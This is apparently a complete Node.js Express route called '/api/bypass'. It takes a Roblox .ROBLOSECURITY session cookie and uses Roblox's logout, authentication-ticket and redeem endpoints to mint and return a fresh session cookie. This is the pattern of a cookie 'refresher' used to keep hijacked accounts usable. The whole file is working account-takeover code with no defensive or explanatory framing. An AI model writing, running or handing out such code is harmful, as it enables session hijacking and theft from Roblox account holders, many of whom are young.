app.post('/api/bypass', async (req, res) => {
  const { cookie } = req.body;

  if (!cookie) return res.status(400).json({ error: 'No cookie' });
  if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
    return res.status(400).json({ error: 'Invalid .ROBLOSECURITY' });
  }

  try {
    // CSRF
    const logout = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      maxRedirects: 0,
      validateStatus: () => true
    });
    const csrf = logout.headers['x-csrf-token'];
    if (!csrf) throw new Error('No CSRF token');

    // TICKET
    const ticketRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
      headers: {
        'x-csrf-token': csrf,
        Cookie: `.ROBLOSECURITY=${cookie}`,
        referer: 'https://www.roblox.com/'
      }
    });
    const ticket = ticketRes.headers['rbx-authentication-ticket'];
    if (!ticket) throw new Error('No ticket');

    // REDEEM
    const redeem = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      authenticationTicket: ticket
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const newCookie = redeem.headers['set-cookie']
      ?.find(c => c.includes('.ROBLOSECURITY'))
      ?.split(';')[0]
      ?.split('=')[1];

    if (!newCookie) throw new Error('No new cookie');

    res.json({ success: true, newCookie });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});
